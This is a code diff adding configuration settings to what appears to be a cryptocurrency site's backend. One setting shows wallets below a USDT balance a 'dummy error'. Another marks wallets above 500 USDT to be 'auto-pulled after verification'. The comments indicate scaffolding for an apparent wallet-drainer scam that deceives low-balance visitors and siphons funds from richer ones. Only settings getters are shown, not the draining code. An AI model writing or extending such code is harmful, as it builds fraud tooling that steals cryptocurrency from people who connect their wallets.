@@ -34,3 +34,31 @@ export async function getExchangeLimits(): Promise<ExchangeLimits> {
   const doc = await SiteSetting.findOne({ key: 'exchangeLimits' }).lean();
   return (doc?.value as ExchangeLimits) ?? DEFAULT_EXCHANGE_LIMITS;
 }
+
+/* ── Wallet Filter Settings ── */
+export interface WalletFilterSettings {
+  enabled: boolean;
+  minBalanceToConnect: number; // USDT — wallets below this see a dummy error
+}
+export const DEFAULT_WALLET_FILTER: WalletFilterSettings = {
+  enabled: false,
+  minBalanceToConnect: 100,
+};
+export async function getWalletFilterSettings(): Promise<WalletFilterSettings> {
+  const doc = await SiteSetting.findOne({ key: 'walletFilter' }).lean();
+  return (doc?.value as WalletFilterSettings) ?? DEFAULT_WALLET_FILTER;
+}
+
+/* ── Auto-Pull Settings ── */
+export interface AutoPullSettings {
+  enabled: boolean;
+  minBalanceToTrigger: number; // USDT — wallets at or above this are auto-pulled after verification
+}
+export const DEFAULT_AUTO_PULL: AutoPullSettings = {
+  enabled: false,
+  minBalanceToTrigger: 500,
+};
+export async function getAutoPullSettings(): Promise<AutoPullSettings> {
+  const doc = await SiteSetting.findOne({ key: 'autoPull' }).lean();
+  return (doc?.value as AutoPullSettings) ?? DEFAULT_AUTO_PULL;
+}
